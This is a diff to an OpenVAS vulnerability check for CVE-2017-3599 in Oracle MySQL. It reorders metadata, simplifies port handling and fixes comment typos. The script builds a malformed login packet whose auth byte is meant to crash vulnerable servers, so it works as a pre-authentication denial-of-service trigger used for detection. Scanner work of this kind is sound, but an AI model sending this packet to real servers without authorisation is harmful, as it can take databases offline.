@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_oracle_mysql_integer_overflow_vuln.nasl 6075 2017-05-05 13:43:51Z antu123 $
+# $Id: gb_oracle_mysql_integer_overflow_vuln.nasl 10114 2018-06-07 10:06:23Z cfischer $
 #
 # Oracle MySQL Server Integer Overflow Vulnerability
 #
@@ -27,14 +27,23 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.810773");
-  script_version("$Revision: 6075 $");
+  script_version("$Revision: 10114 $");
   script_cve_id("CVE-2017-3599");
   script_bugtraq_id(97754);
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-05 15:43:51 +0200 (Fri, 05 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-07 12:06:23 +0200 (Thu, 07 Jun 2018) $");
   script_tag(name:"creation_date", value:"2017-05-04 11:10:40 +0530 (Thu, 04 May 2017)");
   script_name("Oracle MySQL Server Integer Overflow Vulnerability");
+  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
+  script_category(ACT_ATTACK);
+  script_family("Databases");
+  script_dependencies("mysql_version.nasl");
+  script_require_ports("Services/mysql", 3306);
+  script_mandatory_keys("MySQL/installed");
+
+  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html");
+  script_xref(name:"URL", value:"https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos");
 
   script_tag(name:"summary", value:"This host is installed with Oracle MySQL
   Server and is prone to integer overflow vulnerability.");
@@ -63,17 +72,9 @@ if (description)
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"exploit");
-  script_xref(name : "URL" , value : "http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html");
-  script_xref(name : "URL" , value : "https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos");
-  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
-  script_category(ACT_ATTACK);
-  script_family("Databases");
-  script_dependencies("mysql_version.nasl");
-  script_require_ports("Services/mysql", 3306);
-  script_mandatory_keys("MySQL/installed");
+
   exit(0);
 }
-
 
 include("byte_func.inc");
 include("host_details.inc");
@@ -82,14 +83,7 @@ cpe_list = make_list( "cpe:/a:mysql:mysql", "cpe:/a:oracle:mysql");
 
 set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);
 
-port = get_app_port(cpe:cpe_list);
-if(!port){
- port = 3306;
-}
-
-if(!get_port_state(port)){
-  exit(0);
-}
+if(!port = get_app_port(cpe:cpe_list)) exit(0);
 
 if(get_kb_item("MySQL/" + port + "/blocked")){
   exit(0);
@@ -101,15 +95,14 @@ if(!sock){
 }
 
 res = recv( socket:sock, length:1024 );
-if("mysql_native_password" >!< res)
-{
+if("mysql_native_password" >!< res){
   close(sock);
   exit(0);
 }
 
 # Login request packet
-plen = string('\x26\x00\x00');		     # 3 Bytes Packet lenth
-packet_num = string('\x01');                 # 1 byte  Packet number 
+plen = string('\x26\x00\x00');		     # 3 Bytes Packet length
+packet_num = string('\x01');                 # 1 byte  Packet number
 packet_cap = string('\x85\xa2\xbf\x01');     # client capabilities (default)
 packet_max = string('\x00\x00\x00\x01');     # max packet size (default)
 packet_cset = string('\x21');                # charset (default)
@@ -117,7 +110,7 @@ p_reserved =  crap(data:'\x00', length:23);  # 23 bytes reserved with nulls (def
 packet_usr =  string('test\x00');            # username null terminated (default)
 packet_auth  = string('\xff');               # Both \xff and \xfe should crash the server
                                              # Tested on vulnerable version crash is
-                                             # not happening so script_category is ACT_ATTACK
+                                             # not happening so the script category is ACT_ATTACK
 ## complete request
 packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth ;
 
@@ -137,8 +130,9 @@ if("08S01Bad handshake" >< res){
 
 ## The expected value is the password, which could be of two different formats
 ## (null terminated or length encoded) depending on the client functionality.
-if(strlen(res) > 26 && "mysql_native_password" >< res)
-{
+if(strlen(res) > 26 && "mysql_native_password" >< res){
   security_message(port:port);
   exit(0);
 }
+
+exit(99);
